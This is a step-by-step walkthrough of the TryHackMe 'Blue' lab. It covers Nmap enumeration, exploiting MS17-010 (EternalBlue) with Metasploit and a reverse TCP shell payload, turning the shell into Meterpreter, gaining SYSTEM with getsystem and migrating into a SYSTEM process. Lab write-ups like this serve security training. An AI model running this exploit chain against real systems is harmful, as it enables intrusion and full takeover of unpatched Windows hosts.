# 1.TryHackMe - Blue Room (Enumeration using Nmap)

## Objective

Scan the target machine to discover open ports and identify vulnerabilities before exploitation.

---

## Step 1: Perform a Basic Nmap Scan

```bash id="8dugk6"
nmap <Target_IP>
```

Example:

```bash id="4jd2al"
nmap 10.49.135.64
```

### Explanation

* Scans the most common 1000 TCP ports.
* Displays open ports and running services.
* Used for initial reconnaissance.

---

## Step 2: Count Open Ports Below 1000

Example Output:

```text id="4d6o7i"
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### Explanation

Only **3 ports** are open with port numbers below **1000**.

**Answer:**

```text id="0af1vy"
3
```

---

## Step 3: Run an SMB Vulnerability Scan

```bash id="sx7mo5"
nmap --script smb-vuln* -p445 <Target_IP>
```

Example:

```bash id="mv6r8d"
nmap --script smb-vuln* -p445 10.49.135.64
```

### Explanation

* Runs SMB vulnerability detection scripts.
* Scans port **445** for known SMB vulnerabilities.
* Checks whether the target is vulnerable to **MS17-010 (EternalBlue)**.

---

## Step 4: Identify the Vulnerability

Example Output:

```text id="gqg43p"
Host script results:

smb-vuln-ms17-010:
VULNERABLE
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

### Explanation

The scan confirms that the target is vulnerable to the **MS17-010 (EternalBlue)** vulnerability.

**Answer:**

```text id="d5y5l4"
ms17-010
```

# 2.Exploiting the Target Machine using Metasploit

### Step 1: Start Metasploit

Launch the Metasploit Framework.

```bash
msfconsole
```

### Step 2: Search for the Exploit

Search for the MS17-010 (EternalBlue) exploit module.

```bash
search ms17_010
```

### Step 3: Select the Exploit Module

Load the EternalBlue exploit.

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Step 4: Display Module Options

View all configurable options for the exploit.

```bash
show options
```

### Step 5: Configure the Target

Set the required target IP address.

```bash
set RHOSTS <Target_IP>
```

Example:

```bash
set RHOSTS 10.49.135.64
```

### Step 6: Change the Payload

Configure the reverse TCP shell payload.

```bash
set payload windows/x64/shell/reverse_tcp
```

### Step 7: Execute the Exploit

Launch the exploit against the target.

```bash
exploit
```

or

```bash
run
```

### Step 8: Verify the Shell

If the exploit is successful, a Windows command shell (DOS shell) will open. If the prompt does not appear immediately, press **Enter**.

### Step 9: Background the Session

To keep the shell active while returning to the Metasploit console, press:

```text
CTRL + Z
```

When prompted:

```text
Background session? [y/N]
```

Type:

```text
y
```

The session will continue running in the background.

# 3.TryHackMe Blue — Privilege Escalation

## Objective

The goal of this section is to:

1. Convert a normal shell into a **Meterpreter session**
2. Verify **SYSTEM privileges**
3. Find a process running as `NT AUTHORITY\SYSTEM`
4. Migrate the Meterpreter session into that process

---

## Q1. Set the required option

### What is this asking?

The `shell_to_meterpreter` module needs an existing shell **session ID**.

### Commands

```bash
use post/multi/manage/shell_to_meterpreter
```

Check the available options:

```bash
show options
```

List active sessions:

```bash
sessions -l
```

Set the shell session:

```bash
set SESSION <SESSION_ID>
```

Example:

```bash
set SESSION 1
```

### Meaning

* `use` → selects a Metasploit module
* `show options` → displays required module settings
* `sessions -l` → lists available sessions
* `set SESSION` → tells the module which shell session to convert

---

# Q2. Run the conversion

### What is this asking?

Convert the existing **shell session → Meterpreter session**.

### Command

```bash
run
```

After it finishes, check the sessions:

```bash
sessions -l
```

You should see a newly created Meterpreter session.

---

# Q3. Select the Meterpreter session

### What is this asking?

The conversion creates a new session. You need to interact with that session.

```bash
sessions -l
```

Find the Meterpreter session ID, then:

```bash
sessions -i <METERPRETER_SESSION_ID>
```

Example:

```bash
sessions -i 2
```

Your prompt should now look like:

```text
meterpreter >
```

---

# Q4. Verify SYSTEM privileges

### What is this asking?

Check whether the Meterpreter session has **NT AUTHORITY\SYSTEM** privileges.

Run:

```bash
getuid
```

Then attempt SYSTEM privilege escalation:

```bash
getsystem
```

Verify again:

```bash
getuid
```

If successful, you should see:

```text
NT AUTHORITY\SYSTEM
```

### Optional Windows verification

Open a Windows command shell:

```bash
shell
```

Then:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

Exit the Windows shell:

```cmd
exit
```

---

# Q5. Find a SYSTEM process

### What is this asking?

Even though you have SYSTEM privileges, the Meterpreter process itself may not be running inside the most suitable SYSTEM process.

List all running processes:

```bash
ps
```

Look through the **User** column and find a process running as:

```text
NT AUTHORITY\SYSTEM
```

Note the **PID** from the far-left column.

Example:

```text
PID     Name        User
----    --------    ---------------------
1234    process.exe NT AUTHORITY\SYSTEM
```

Here:

```text
PID = 1234
```

> The PID will be different on your machine.

---

# Q6. Migrate to the SYSTEM process

### What is this asking?

Move the Meterpreter session into the SYSTEM process identified in the previous step.

Use:

```bash
migrate <PROCESS_ID>
```

Example:

```bash
migrate 1234
```

Replace `1234` with the PID you found using `ps`.

Migration may take a few attempts because process migration can be unstable.
